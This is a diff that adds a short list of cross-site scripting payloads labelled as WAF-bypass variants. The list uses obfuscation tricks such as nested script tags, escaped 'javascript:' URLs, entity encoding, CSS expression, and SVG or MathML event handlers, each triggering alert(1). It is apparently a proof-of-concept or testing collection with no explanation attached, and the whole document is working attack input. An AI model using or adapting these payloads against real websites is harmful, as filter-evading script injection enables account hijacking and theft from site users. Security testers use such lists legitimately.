@@ -1,0 +1,11 @@
+# XSS WAF-bypass variants (benign alert payloads)
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<svg/oNLoAd=alert(1)>
+<img src=x onerror=al\x65rt(1)>
+<iframe src=jav\u0061script:alert(1)>
+<a href=jav&#x61;script:alert(1)>x</a>
+<div style="width:expression(alert(1))">x</div>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>
+<math><maction actiontype="statusline#http://" xlink:href="javascript:alert(1)">x</maction></math>
+
+
